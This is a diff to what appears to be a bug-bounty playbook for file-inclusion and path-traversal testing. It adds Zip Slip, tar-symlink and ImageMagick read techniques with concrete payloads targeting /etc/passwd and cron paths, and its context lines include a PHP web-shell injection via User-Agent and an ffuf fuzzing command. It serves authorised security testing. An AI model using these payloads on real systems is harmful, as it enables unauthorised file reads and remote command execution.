@@ -169,6 +169,11 @@ curl -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
 ?file=zip:///var/www/uploads/a.zip%23path/inside.txt
 ```
 
+### Phase 8b — Archive-extraction & image-processing sinks (no `?file=` needed)
+Two LFI/traversal surfaces that are not query-parameter file reads:
+- **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../../../etc/cron.d/x`, or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the upload dir. Disclosed: reports/1439593, reports/733072, reports/822262.
+- **ImageMagick coder read-sink** — image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `hunt-file-upload`.
+
 ### Phase 9 — Automation (then manual-confirm everything)
 ```bash
 ffuf -u "https://$TARGET/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
